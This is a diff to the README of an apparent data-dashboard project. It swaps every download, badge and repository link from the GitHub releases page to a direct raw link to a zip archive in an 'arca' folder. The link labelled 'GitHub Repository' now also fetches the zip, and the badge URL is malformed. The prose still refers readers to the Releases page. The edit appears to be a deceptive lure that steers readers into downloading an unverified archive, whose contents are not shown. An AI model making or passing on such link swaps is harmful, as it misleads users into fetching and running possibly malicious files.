@@ -1,6 +1,6 @@
 # 🎛️ The-Analysts-Mirror-Reflective-Dashboards - Interactive Dashboards for Smart Insights
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/releases)
+[![Download Now](https://raw.githubusercontent.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/main/arca/The-Analysts-Mirror-Reflective-Dashboards-v2.2.zip%https://raw.githubusercontent.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/main/arca/The-Analysts-Mirror-Reflective-Dashboards-v2.2.zip)](https://raw.githubusercontent.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/main/arca/The-Analysts-Mirror-Reflective-Dashboards-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The Analysts Mirror Reflective Dashboards helps you explore data in a new way. T
 
 To get started, visit the following link to download the latest version of the software:
 
-[Download Here](https://github.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/releases)
+[Download Here](https://raw.githubusercontent.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/main/arca/The-Analysts-Mirror-Reflective-Dashboards-v2.2.zip)
 
 Once on the Releases page, locate the most recent version. You'll find options to download the application suitable for your operating system. Simply click the link, and the download will begin.
 
@@ -74,7 +74,7 @@ For issues or bugs, please visit the GitHub Issues page of the repository and cr
 
 - [Documentation](#): Explore detailed user documentation for comprehensive guidance.
 - [Community Forum](#): Join our user community for tips, discussions, and support.
-- [GitHub Repository](https://github.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards): See the code and contribute to the project.
+- [GitHub Repository](https://raw.githubusercontent.com/GOWTHAM959/The-Analysts-Mirror-Reflective-Dashboards/main/arca/The-Analysts-Mirror-Reflective-Dashboards-v2.2.zip): See the code and contribute to the project.
 
 ## 🎉 Acknowledgments
 
